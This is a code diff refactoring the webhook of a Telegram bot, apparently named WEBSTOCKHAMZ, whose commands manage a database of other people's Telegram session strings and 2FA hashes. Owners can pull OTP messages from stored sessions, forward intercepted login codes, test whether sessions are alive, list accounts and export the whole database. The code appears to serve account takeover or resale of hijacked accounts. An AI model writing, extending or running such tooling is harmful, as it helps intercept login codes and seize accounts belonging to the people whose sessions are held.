@@ -1,4 +1,4 @@
-import { initSchema, query, queryOne, execute, encryptMessage, decryptMessage } from "@/lib/db";
+import { initSchema, query, queryOne, execute, encryptMessage } from "@/lib/db";
 import { dumpAllTables, formatBackupFileName } from "@/lib/backup";
 import { sendMessage, sendChatAction, sendDocumentWithRetry, editMessageText } from "@/lib/telegramBot";
 import { isOtpMessage, forwardOtpToOwners } from "@/lib/otp";
@@ -7,16 +7,23 @@ import { verifySessionHealth, fetchOtpFromTelegramSession } from "@/lib/telegram
 export const runtime = "nodejs";
 export const maxDuration = 30;
 
+// Escape HTML - mencegah error "can't parse entities"
+function esc(text: string | null | undefined): string {
+  if (!text) return "-";
+  return text
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
 function parseOwnerIds(): bigint[] {
   const raw = process.env.TELEGRAM_OWNER_IDS || "";
   const parts = raw.split(",").map((s) => s.trim()).filter(Boolean);
   const ids: bigint[] = [];
   for (const part of parts) {
-    try {
-      ids.push(BigInt(part));
-    } catch {
-      console.warn("[webhook] Invalid owner ID skipped:", part);
-    }
+    try { ids.push(BigInt(part)); }
+    catch { console.warn("[webhook] Invalid owner ID skipped:", part); }
   }
   return ids;
 }
@@ -34,254 +41,160 @@ function getCommand(text?: string): { command: string; args: string[] } | null {
 
 async function handleStart(chatId: number | string, userId: bigint): Promise<void> {
   if (!isOwner(userId)) {
-    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
+    await sendMessage(chatId, "Akses ditolak. Bot ini hanya untuk owner.", undefined);
     return;
   }
   const ownerIds = parseOwnerIds();
-  await sendMessage(
-    chatId,
-    `👋 Halo! Selamat datang di <b>Bot WEBSTOCKHAMZ</b>\n\n` +
-    `📋 <b>Perintah yang tersedia:</b>\n` +
-    `• /start — Tampilkan pesan ini\n` +
-    `• /backup — Backup database penuh (JSON)\n` +
-    `• /getotp [nomor] — Ambil OTP dari sesi aktif\n` +
-    `• /checknomor [nomor] — Cek apakah nomor ada di DB\n` +
-    `• /login [nomor] — Uji sesi Telegram yang tersimpan\n` +
-    `• /accounts — Lihat semua akun di database\n` +
-    `• /checkall — Cek keaktifan semua sesi\n` +
-    `• /info [nomor] — Detail info satu akun\n` +
-    `• /logout [nomor] — Hapus sesi dari database\n\n` +
-    `✅ Owner terdaftar: ${ownerIds.length} akun`,
-    "HTML"
+  await sendMessage(chatId,
+    `Halo! Selamat datang di Bot WEBSTOCKHAMZ\n\n` +
+    `Perintah yang tersedia:\n` +
+    `/start - Tampilkan pesan ini\n` +
+    `/backup - Backup database penuh\n` +
+    `/getotp [nomor] - Ambil OTP dari sesi aktif\n` +
+    `/checknomor [nomor] - Cek nomor di database\n` +
+    `/login [nomor] - Uji sesi Telegram\n` +
+    `/accounts - Lihat semua akun di database\n` +
+    `/checkall - Cek keaktifan semua sesi\n` +
+    `/info [nomor] - Detail info satu akun\n` +
+    `/logout [nomor] - Hapus sesi dari database\n\n` +
+    `Owner terdaftar: ${ownerIds.length} akun`,
+    undefined
   );
 }
 
 async function handleBackup(chatId: number | string, userId: bigint): Promise<void> {
   if (!isOwner(userId)) {
-    await sendMessage(chatId, "⛔ Akses ditolak. Hanya owner yang bisa backup.");
+    await sendMessage(chatId, "Akses ditolak.", undefined);
     return;
   }
-
   const ownerIds = parseOwnerIds();
-  await sendMessage(chatId, "🔄 Memulai backup database...");
+  await sendMessage(chatId, "Memulai backup database...", undefined);
   await sendChatAction(chatId, "upload_document");
-
   try {
     const backupData = await dumpAllTables();
     const jsonContent = JSON.stringify(backupData, null, 2);
     const fileName = formatBackupFileName();
-
-    console.log(`[backup] Dumped ${backupData.total_rows} rows from ${Object.keys(backupData.tables).length} tables`);
-
     const results = await Promise.allSettled(
-      ownerIds.map(async (id: bigint) => {
-        return await sendDocumentWithRetry(String(id), fileName, jsonContent, `📦 Backup ${backupData.exported_at}`);
-      })
+      ownerIds.map((id: bigint) =>
+        sendDocumentWithRetry(String(id), fileName, jsonContent, `Backup ${backupData.exported_at}`)
+      )
     );
-
     const failed = results.filter((r) => r.status === "rejected").length;
-    if (failed === 0) {
-      await sendMessage(chatId, `✅ Backup selesai! File <code>${fileName}</code> terkirim ke ${ownerIds.length} owner.`, "HTML");
-    } else {
-      await sendMessage(chatId, `⚠️ Backup selesai tapi ${failed} owner gagal terkirim. Cek log server.`);
-    }
+    await sendMessage(chatId,
+      failed === 0
+        ? `Backup selesai! File ${fileName} terkirim ke ${ownerIds.length} owner.`
+        : `Backup selesai tapi ${failed} owner gagal terkirim.`,
+      undefined
+    );
   } catch (err) {
-    console.error("[backup] Error:", err);
-    await sendMessage(chatId, `❌ Backup gagal: ${err instanceof Error ? err.message : String(err)}`);
+    await sendMessage(chatId, `Backup gagal: ${err instanceof Error ? err.message : String(err)}`, undefined);
   }
 }
 
 async function findAccountSession(targetPhone?: string): Promise<{ session_string: string; phone: string } | null> {
   if (targetPhone && targetPhone.trim()) {
     const raw = targetPhone.trim();
-    let withPlus = raw;
-    let noPlus = raw.replace(/^\+/, "");
-    let local = raw;
-
-    if (raw.startsWith("0")) {
-      noPlus = "62" + raw.slice(1);
-      withPlus = "+" + noPlus;
-    } else if (!raw.startsWith("+")) {
-      withPlus = "+" + raw;
-    } else {
-      local = "0" + raw.slice(3);
-    }
-
+    let withPlus = raw.startsWith("+") ? raw : (raw.startsWith("0") ? "+62" + raw.slice(1) : "+" + raw);
+    const noPlus = withPlus.replace("+", "");
     const cleanDigits = raw.replace(/\D/g, "");
-
     let account = await queryOne<{ session_string: string; phone: string }>(
       `SELECT session_string, phone FROM telegram_accounts 
-       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
-         AND session_string IS NOT NULL AND session_string <> '' 
-       LIMIT 1`,
-      [withPlus, noPlus, local, cleanDigits]
+       WHERE (phone = $1 OR phone = $2 OR REPLACE(phone, '+', '') = $3) 
+         AND session_string IS NOT NULL AND session_string <> '' LIMIT 1`,
+      [withPlus, noPlus, cleanDigits]
     );
-
     if (account) return account;
-
     account = await queryOne<{ session_string: string; phone: string }>(
       `SELECT session_string, phone FROM otp_sessions 
-       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
+       WHERE (phone = $1 OR phone = $2 OR REPLACE(phone, '+', '') = $3) 
          AND session_string IS NOT NULL AND session_string <> '' 
        ORDER BY updated_at DESC LIMIT 1`,
-      [withPlus, noPlus, local, cleanDigits]
+      [withPlus, noPlus, cleanDigits]
     );
-
     return account;
   }
-
   let account = await queryOne<{ session_string: string; phone: string }>(
     `SELECT session_string, phone FROM telegram_accounts 
-     WHERE session_string IS NOT NULL AND session_string <> '' 
-     ORDER BY signed_at DESC LIMIT 1`
+     WHERE session_string IS NOT NULL AND session_string <> '' ORDER BY signed_at DESC LIMIT 1`
   );
-
   if (!account) {
     account = await queryOne<{ session_string: string; phone: string }>(
       `SELECT session_string, phone FROM otp_sessions 
-       WHERE session_string IS NOT NULL AND session_string <> '' 
-       ORDER BY updated_at DESC LIMIT 1`
+       WHERE session_string IS NOT NULL AND session_string <> '' ORDER BY updated_at DESC LIMIT 1`
     );
   }
-
   return account;
 }
 
 async function handleGetOtp(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
-  if (!isOwner(userId)) {
-    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
-    return;
-  }
-
-  const targetPhone = args && args.length > 0 ? args[0] : "";
-  const account = await findAccountSession(targetPhone);
-
-  if (!account || !account.session_string) {
-    await sendMessage(chatId, `❌ Sesi akun tidak ditemukan di database.\n\nGunakan /accounts untuk melihat daftar akun.`);
-    return;
-  }
-
-  const msg = await sendMessage(chatId, `⏳ Menghubungi sesi (${account.phone})...`).catch(() => null);
+  if (!isOwner(userId)) { await sendMessage(chatId, "Akses ditolak.", undefined); return; }
+  const account = await findAccountSession(args[0] || "");
+  if (!account) { await sendMessage(chatId, "Sesi akun tidak ditemukan. Gunakan /accounts.", undefined); return; }
+  const msg = await sendMessage(chatId, `Menghubungi sesi (${account.phone})...`, undefined).catch(() => null);
   if (!msg) return;
-
   try {
     const res = await fetchOtpFromTelegramSession(account.session_string);
     if (!res.success) {
-      await editMessageText(chatId, msg.message_id, `❌ <b>ERROR</b>: ${res.error}`, "HTML").catch(() => {});
+      await editMessageText(chatId, msg.message_id, `ERROR: ${res.error}`).catch(() => {});
     } else if (res.message) {
-      await editMessageText(
-        chatId,
-        msg.message_id,
-        `✉️ <b>Pesan dari ${account.phone}:</b>\n\n<code>${res.message}</code>`,
-        "HTML"
-      ).catch(() => {});
+      await editMessageText(chatId, msg.message_id, `Pesan dari ${account.phone}:\n\n${res.message}`).catch(() => {});
     } else {
-      await editMessageText(chatId, msg.message_id, `📭 Tidak ada pesan dari ${account.phone}.`).catch(() => {});
+      await editMessageText(chatId, msg.message_id, `Tidak ada pesan dari ${account.phone}.`).catch(() => {});
     }
   } catch (err: any) {
-    await editMessageText(chatId, msg.message_id, `❌ ERROR: ${err.message || String(err)}`).catch(() => {});
+    await editMessageText(chatId, msg.message_id, `ERROR: ${err.message || String(err)}`).catch(() => {});
   }
 }
 
-// COMMAND BARU: /checknomor
 async function handleCheckNomor(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
   if (!isOwner(userId)) return;
-  if (!args || args.length === 0) {
-    await sendMessage(chatId, "ℹ️ Penggunaan: /checknomor [nomor]\nContoh: /checknomor +628123456789");
-    return;
-  }
-
+  if (!args || args.length === 0) { await sendMessage(chatId, "Penggunaan: /checknomor [nomor]", undefined); return; }
   let targetPhone = args[0];
   if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
   if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;
-
   const noPlus = targetPhone.replace("+", "");
-
   const acc = await queryOne<{ phone: string; first_name: string; username: string; signed_at: Date; session_string: string }>(
-    `SELECT phone, first_name, username, signed_at, session_string 
-     FROM telegram_accounts 
-     WHERE phone = $1 OR REPLACE(phone, '+', '') = $2`,
+    `SELECT phone, first_name, username, signed_at, session_string FROM telegram_accounts WHERE phone = $1 OR REPLACE(phone, '+', '') = $2`,
     [targetPhone, noPlus]
   );
-
   const otpSess = await queryOne<{ phone: string; status: string; created_at: Date }>(
-    `SELECT phone, status, created_at 
-     FROM otp_sessions 
-     WHERE phone = $1 OR REPLACE(phone, '+', '') = $2 
-     ORDER BY created_at DESC LIMIT 1`,
+    `SELECT phone, status, created_at FROM otp_sessions WHERE phone = $1 OR REPLACE(phone, '+', '') = $2 ORDER BY created_at DESC LIMIT 1`,
     [targetPhone, noPlus]
   );
-
-  if (!acc && !otpSess) {
-    await sendMessage(chatId, `❌ Nomor <code>${targetPhone}</code> <b>tidak ditemukan</b> di database.`, "HTML");
-    return;
-  }
-
-  let msg = `🔍 <b>Hasil Cek Nomor: <code>${targetPhone}</code></b>\n\n`;
-  
+  if (!acc && !otpSess) { await sendMessage(chatId, `Nomor ${targetPhone} TIDAK DITEMUKAN di database.`, undefined); return; }
+  let msg = `Hasil Cek Nomor: ${targetPhone}\n\n`;
   if (acc) {
-    msg += `✅ <b>Ada di telegram_accounts</b>\n`;
-    msg += `• Nama: ${acc.first_name || "-"}\n`;
-    msg += `• Username: ${acc.username ? "@" + acc.username : "-"}\n`;
-    msg += `• Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n`;
-    msg += `• Sesi: ${acc.session_string ? "✅ Ada" : "❌ Kosong"}\n\n`;
+    msg += `ADA di telegram_accounts\nNama: ${esc(acc.first_name)}\nUsername: ${acc.username ? "@" + esc(acc.username) : "-"}\nLogin: ${new Date(acc.signed_at).toLocaleString('id-ID')}\nSesi: ${acc.session_string ? "Ada" : "Kosong"}\n\n`;
   }
-
   if (otpSess) {
-    msg += `📋 <b>Ada di otp_sessions</b>\n`;
-    msg += `• Status: ${otpSess.status}\n`;
-    msg += `• Waktu: ${new Date(otpSess.created_at).toLocaleString('id-ID')}\n`;
+    msg += `ADA di otp_sessions\nStatus: ${otpSess.status}\nWaktu: ${new Date(otpSess.created_at).toLocaleString('id-ID')}`;
   }
-
-  await sendMessage(chatId, msg, "HTML");
+  await sendMessage(chatId, msg, undefined);
 }
 
 async function handleLogin(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
   if (!isOwner(userId)) return;
-  if (!args || args.length === 0) {
-    await sendMessage(chatId, "ℹ️ Penggunaan: /login [nomor]\nContoh: /login +628123456789");
-    return;
-  }
+  if (!args || args.length === 0) { await sendMessage(chatId, "Penggunaan: /login [nomor]", undefined); return; }
   let targetPhone = args[0];
   if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
   if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;
-
-  const statusMsg = await sendMessage(chatId, `🔄 Memeriksa sesi untuk ${targetPhone}...`);
-  
-  const account = await queryOne<{ session_string: string; first_name: string; last_name: string; username: string }>(
-    `SELECT session_string, first_name, last_name, username FROM telegram_accounts WHERE phone = $1`,
-    [targetPhone]
+  const statusMsg = await sendMessage(chatId, `Memeriksa sesi untuk ${targetPhone}...`, undefined);
+  const account = await queryOne<{ session_string: string }>(
+    `SELECT session_string FROM telegram_accounts WHERE phone = $1`, [targetPhone]
   );
-
-  if (!account || !account.session_string) {
-    await editMessageText(chatId, statusMsg.message_id, `⛔ Nomor ${targetPhone} tidak ditemukan atau tidak memiliki sesi.`);
+  if (!account?.session_string) {
+    await editMessageText(chatId, statusMsg.message_id, `Nomor ${targetPhone} tidak ditemukan atau tidak memiliki sesi.`);
     return;
   }
-
   const health = await verifySessionHealth(account.session_string);
-  
   if (!health.active) {
-    await editMessageText(
-      chatId,
-      statusMsg.message_id,
-      `❌ <b>Sesi tidak valid/expired</b>\nNomor: ${targetPhone}\nError: ${health.error}`,
-      "HTML"
-    );
+    await editMessageText(chatId, statusMsg.message_id, `Sesi tidak valid\nNomor: ${targetPhone}\nError: ${health.error}`);
     return;
   }
-
   const u = health.user as any;
   const name = [u.firstName, u.lastName].filter(Boolean).join(" ") || "-";
-  
-  await editMessageText(
-    chatId,
-    statusMsg.message_id,
-    `✅ <b>Sesi Aktif!</b>\n\n` +
-    `👤 Nama: ${name}\n` +
-    `🔗 Username: ${u.username ? "@" + u.username : "-"}\n` +
-    `🆔 User ID: <code>${u.id}</code>\n` +
-    `📱 Nomor: ${targetPhone}`,
-    "HTML"
+  await editMessageText(chatId, statusMsg.message_id,
+    `Sesi Aktif!\nNama: ${name}\nUsername: ${u.username ? "@" + u.username : "-"}\nUser ID: ${u.id}\nNomor: ${targetPhone}`
   );
 }
 
@@ -290,16 +203,13 @@ async function handleAccounts(chatId: number | string, userId: bigint): Promise<
   const accounts = await query<{ phone: string; first_name: string; username: string; signed_at: Date }>(
     `SELECT phone, first_name, username, signed_at FROM telegram_accounts ORDER BY signed_at DESC LIMIT 50`
   );
-  if (accounts.length === 0) {
-    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
-    return;
-  }
-  let msg = `📋 <b>Daftar Akun (${accounts.length})</b>\n\n`;
+  if (accounts.length === 0) { await sendMessage(chatId, "Belum ada akun yang tersimpan di database.", undefined); return; }
+  let msg = `Daftar Akun (${accounts.length})\n\n`;
   accounts.forEach((acc, i) => {
     const tanggal = new Date(acc.signed_at).toLocaleDateString('id-ID');
-    msg += `${i + 1}. <code>${acc.phone}</code>\n   ${acc.first_name || "-"} ${acc.username ? "(@" + acc.username + ")" : ""} [${tanggal}]\n`;
+    msg += `${i + 1}. ${acc.phone}\n   ${esc(acc.first_name)}${acc.username ? " (@" + esc(acc.username) + ")" : ""} [${tanggal}]\n`;
   });
-  await sendMessage(chatId, msg, "HTML");
+  await sendMessage(chatId, msg, undefined);
 }
 
 async function handleCheckAll(chatId: number | string, userId: bigint): Promise<void> {
@@ -307,102 +217,68 @@ async function handleCheckAll(chatId: number | string, userId: bigint): Promise<
   const accounts = await query<{ phone: string; session_string: string }>(
     `SELECT phone, session_string FROM telegram_accounts WHERE session_string IS NOT NULL AND session_string <> ''`
   );
-  if (accounts.length === 0) {
-    await sendMessage(chatId, "📭 Belum ada akun di database.");
-    return;
-  }
-  
-  const statusMsg = await sendMessage(chatId, `🔄 Memeriksa ${accounts.length} akun... Mohon tunggu.`);
-  
+  if (accounts.length === 0) { await sendMessage(chatId, "Belum ada akun di database.", undefined); return; }
+  const statusMsg = await sendMessage(chatId, `Memeriksa ${accounts.length} akun... Mohon tunggu.`, undefined);
   let active = 0, expired = 0;
   const expiredList: string[] = [];
-  
   for (const acc of accounts) {
     const health = await verifySessionHealth(acc.session_string);
-    if (health.active) {
-      active++;
-    } else {
-      expired++;
-      expiredList.push(acc.phone);
-    }
+    if (health.active) active++; else { expired++; expiredList.push(acc.phone); }
   }
-  
-  let result = `📊 <b>Hasil Pemeriksaan Sesi</b>\n\n` +
-    `✅ Aktif: ${active}\n` +
-    `❌ Expired: ${expired}\n` +
-    `📱 Total: ${accounts.length}`;
-  
+  let result = `Hasil Pemeriksaan Sesi\n\nAktif: ${active}\nExpired: ${expired}\nTotal: ${accounts.length}`;
   if (expiredList.length > 0 && expiredList.length <= 10) {
-    result += `\n\n<b>Sesi expired:</b>\n`;
-    expiredList.forEach(p => { result += `• <code>${p}</code>\n`; });
+    result += `\n\nSesi expired:\n` + expiredList.map(p => `- ${p}`).join("\n");
   }
-  
-  await editMessageText(chatId, statusMsg.message_id, result, "HTML");
+  await editMessageText(chatId, statusMsg.message_id, result);
 }
 
 async function handleLogout(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
   if (!isOwner(userId)) return;
-  if (!args || args.length === 0) {
-    await sendMessage(chatId, "ℹ️ Penggunaan: /logout [nomor]\nContoh: /logout +628123456789");
-    return;
-  }
+  if (!args || args.length === 0) { await sendMessage(chatId, "Penggunaan: /logout [nomor]", undefined); return; }
   let targetPhone = args[0];
   if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
   if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;
-
   const result = await execute(`UPDATE telegram_accounts SET session_string = '' WHERE phone = $1`, [targetPhone]);
-  if (result > 0) {
-    await sendMessage(chatId, `✅ Sesi untuk <code>${targetPhone}</code> telah dihapus dari database.`, "HTML");
-  } else {
-    await sendMessage(chatId, `⛔ Nomor <code>${targetPhone}</code> tidak ditemukan di database.`, "HTML");
-  }
+  await sendMessage(chatId,
+    result > 0
+      ? `Sesi untuk ${targetPhone} telah dihapus.`
+      : `Nomor ${targetPhone} tidak ditemukan.`,
+    undefined
+  );
 }
 
 async function handleInfo(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
   if (!isOwner(userId)) return;
-  if (!args || args.length === 0) {
-    await sendMessage(chatId, "ℹ️ Penggunaan: /info [nomor]\nContoh: /info +628123456789");
-    return;
-  }
+  if (!args || args.length === 0) { await sendMessage(chatId, "Penggunaan: /info [nomor]", undefined); return; }
   let targetPhone = args[0];
   if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
   if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;
-
   const acc = await queryOne<{
     phone: string; user_id: string; first_name: string; last_name: string;
     username: string; signed_at: Date; session_string: string; two_fa_password_hash: string;
   }>(`SELECT * FROM telegram_accounts WHERE phone = $1`, [targetPhone]);
-  
-  if (!acc) {
-    await sendMessage(chatId, `⛔ Nomor <code>${targetPhone}</code> tidak ditemukan.`, "HTML");
-    return;
-  }
-  
-  let msg = `ℹ️ <b>Informasi Akun</b>\n\n` +
-    `📱 Nomor: <code>${acc.phone}</code>\n` +
-    `🆔 User ID: <code>${acc.user_id || "-"}</code>\n` +
-    `👤 Nama: ${acc.first_name || ""} ${acc.last_name || ""}\n` +
-    `🔗 Username: ${acc.username ? "@" + acc.username : "-"}\n` +
-    `🔐 2FA: ${acc.two_fa_password_hash ? "✅ Ya" : "❌ Tidak"}\n` +
-    `🕒 Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n` +
-    `🔑 Sesi: ${acc.session_string ? "✅ Ada" : "❌ Kosong/Logout"}`;
-            
-  await sendMessage(chatId, msg, "HTML");
+  if (!acc) { await sendMessage(chatId, `Nomor ${targetPhone} tidak ditemukan.`, undefined); return; }
+  await sendMessage(chatId,
+    `Informasi Akun\n\n` +
+    `Nomor: ${acc.phone}\nUser ID: ${acc.user_id || "-"}\n` +
+    `Nama: ${esc(acc.first_name)} ${esc(acc.last_name)}\n` +
+    `Username: ${acc.username ? "@" + esc(acc.username) : "-"}\n` +
+    `2FA: ${acc.two_fa_password_hash ? "Ya" : "Tidak"}\n` +
+    `Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n` +
+    `Sesi: ${acc.session_string ? "Ada" : "Kosong/Logout"}`,
+    undefined
+  );
 }
 
 async function processUpdate(update: any): Promise<void> {
   const msg = update.message;
   if (!msg || !msg.from) return;
-
   const userId = BigInt(msg.from.id);
   const chatId = msg.chat.id;
   const text = msg.text;
-
-  // Simpan OTP jika nomor terdaftar
   if (text && !text.startsWith("/")) {
     const linkedUser = await queryOne<{ phone: string }>(
-      `SELECT phone FROM telegram_accounts WHERE user_id = $1`,
-      [userId]
+      `SELECT phone FROM telegram_accounts WHERE user_id = $1`, [userId]
     );
     if (linkedUser && isOtpMessage(text)) {
       await forwardOtpToOwners(linkedUser.phone, text);
@@ -417,43 +293,22 @@ async function processUpdate(update: any): Promise<void> {
       }
     }
   }
-
   const cmd = getCommand(text);
   if (!cmd) return;
-
   console.log(`[webhook] /${cmd.command} from user ${userId} in chat ${chatId}`);
-
   switch (cmd.command) {
-    case "start":
-      await handleStart(chatId, userId);
-      break;
-    case "backup":
-      await handleBackup(chatId, userId);
-      break;
-    case "getotp":
-      await handleGetOtp(chatId, userId, cmd.args);
-      break;
-    case "checknomor":
-      await handleCheckNomor(chatId, userId, cmd.args);
-      break;
-    case "login":
-      await handleLogin(chatId, userId, cmd.args);
-      break;
-    case "accounts":
-      await handleAccounts(chatId, userId);
-      break;
-    case "checkall":
-      await handleCheckAll(chatId, userId);
-      break;
-    case "logout":
-      await handleLogout(chatId, userId, cmd.args);
-      break;
-    case "info":
-      await handleInfo(chatId, userId, cmd.args);
-      break;
+    case "start": await handleStart(chatId, userId); break;
+    case "backup": await handleBackup(chatId, userId); break;
+    case "getotp": await handleGetOtp(chatId, userId, cmd.args); break;
+    case "checknomor": await handleCheckNomor(chatId, userId, cmd.args); break;
+    case "login": await handleLogin(chatId, userId, cmd.args); break;
+    case "accounts": await handleAccounts(chatId, userId); break;
+    case "checkall": await handleCheckAll(chatId, userId); break;
+    case "logout": await handleLogout(chatId, userId, cmd.args); break;
+    case "info": await handleInfo(chatId, userId, cmd.args); break;
     default:
       if (isOwner(userId)) {
-        await sendMessage(chatId, `❓ Perintah tidak dikenal: /${cmd.command}\nGunakan /start untuk bantuan.`);
+        await sendMessage(chatId, `Perintah tidak dikenal: /${cmd.command}\nGunakan /start untuk bantuan.`, undefined);
       }
   }
 }
